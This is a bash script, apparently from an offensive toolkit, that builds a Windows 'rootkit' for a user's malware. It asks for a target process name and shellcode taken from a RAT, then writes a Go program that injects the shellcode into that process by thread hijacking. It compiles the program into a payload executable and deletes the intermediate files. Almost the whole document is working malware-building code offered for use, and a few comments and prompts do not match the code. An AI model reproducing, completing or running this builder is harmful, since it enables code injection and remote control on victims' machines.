echo "Welcome to the rootkit builder, which generates a basic windows rootkit for your malware."
echo "To get started, extract the shellcode from your RAT generated by the regular builders."
echo "Please note, that this is only a very basic rootkit, and will get caught very easily by most antivirus"
echo ""
echo "This rootkit builder allows a user to enter a process in which"
echo "thread execution hijacking is performed on to execute the shellcode"
echo ""

# Prompt user for encryption mode
read -p "What process would you like to inject the payload into: " hijacked_process

echo "Insert shellcode (terminate with Ctrl+D when done):"
shellcode_input=""
    while IFS= read -r line; do
        if [[ "$line" == "END" ]]; then
            break
        fi
        shellcode_input+="$line"
    done

# Prepare Go packages
go mod init "windows_rootkit"
go mod tidy

# Generate Go main.go file
cat <<EOF > Code/main.go
package main

import (
	"fmt"
	"unsafe"
	"windows_rootkit/Code/windows_rootkit"
)

func main() {
	// Check if the operating system is Windows
	if !windows_rootkit.CheckOsIsWindows() {
		fmt.Println("This program is designed to run on Windows only.")
		return
	}

	// Find the process ID of process to hijack
	pid, err := windows_rootkit.FindProcessIDByName("$hijacked_process")
	if err != nil {
		fmt.Println("Failed to find process $hijacked_process:", err)
		return
	}

	// Get the thread ID of a thread within the process to hijack
	tid, err := windows_rootkit.GetThreadIDByProcessID(pid)
	if err != nil {
		fmt.Println("Failed to get thread ID:", err)
		return
	}

	// Define shellcode to inject
	var shellcode []byte = []byte{$shellcode_input}

	// Hijack the thread
	err = windows_rootkit.HijackThread(pid, tid, uintptr(unsafe.Pointer(&shellcode[0])), shellcode)
	if err != nil {
		fmt.Println("Thread hijack failed:", err)
		return
	}

	fmt.Println("Thread hijack successful.")
}

EOF

# Compile Go code
if go build -o Code/main Code/main.go; then
    echo "Go code compiled successfully"
else
    echo "Error: Compilation failed" >&2
    exit 1
fi

# Move executable to Payloads directory
if mv Code/main Payloads/main.exe; then
    echo "Executable moved to Payloads directory"
else
    echo "Error: Failed to move executable" >&2
    exit 1
fi

# Delete main.go from code directory
if rm Code/main.go; then
    echo "main.go deleted from code directory"
else
    echo "Error: Failed to delete main.go" >&2
    exit 1
fi

# Delete go.MOD 
if rm go.mod; then
    echo "go.mod deleted successfully"
else
    echo "Error: Failed to delete go.mod" >&2
    exit 1
fi